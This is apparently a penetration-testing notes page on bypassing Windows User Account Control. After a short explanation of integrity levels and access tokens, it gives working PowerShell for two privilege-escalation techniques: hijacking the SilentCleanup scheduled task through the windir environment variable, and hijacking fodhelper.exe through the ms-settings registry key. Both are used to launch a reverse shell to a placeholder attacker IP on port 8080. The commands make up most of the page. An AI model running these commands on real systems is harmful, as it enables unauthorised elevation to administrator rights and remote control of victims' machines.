---
description: Bypassing with DiskCleanup and FodHelper
---

# User Account Control

In `Windows`, every [securable object](https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects) is assigned an [integrity level](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control) so that access can be controlled.

* `Low`, mainly used for internet interactions
* `Medium`, default level
* `High`, indicates elevated access
* `System`, highest possible level

Lower integrities cannot access higher integrity levels but it is allowed reversed direction.

{% hint style="info" %}
More UAC Bypasses:

[https://github.com/rootm0s/WinPwnage](https://github.com/rootm0s/WinPwnage)

[https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-5---bypass-uac-using-computerdefaults-powershell](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-5---bypass-uac-using-computerdefaults-powershell)
{% endhint %}

#### Access Token

An access is an object that describes security context and integrity level. When a user logs in that user gets access token with a medium integrity level. When an admin logs in, they get are high integrity level.

{% hint style="info" %}
User Account Control manages elevation between access tokens.
{% endhint %}

When having a reverse shell as a user who is Administrator and having no GUI access the process is still running at a medium integrity level. Thus we would have to bypass `User Access Control`

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

### <mark style="color:yellow;">**Bypass 1: DiskCleanup Scheduled Task Hijack**</mark>

Using SilentCleaup scheduled task is start from a process with medium integrity level and automatically evelates to high integrity.

```powershell
Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value "cmd.exe /K C:\Windows\Tasks\RShell.exe <IP> 8080 & REM " -Force
Start-ScheduledTask -TaskPath "\Microsoft\Windows\DiskCleanup" -TaskName "SilentCleanup"

# Cleanup
Clear-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Force
```

### <mark style="color:yellow;">**Bypass 2: FodHelper Execution Hijack**</mark>

`fodhelper.exe` has an attribute called `AutoElevate`, meaning when its run by a user at medium integrity level it is automatically elevated to a `high integrity level`.

When `FodHelper` is run, it attempts to read the value of the registry key `"HKCU\Software\Classes\ms-settings\Shell\Open\Command"`. Where `Shell\Open\Command` tells how to open files like GIF would be opened with iexplore.exe, we can change this to cmd.

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd" -Force

C:\Windows\System32\fodhelper.exe
```

Or get a revers shell

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\Tasks\RShell <IP> 8080" -Force

C:\Windows\System32\fodhelper.exe
```
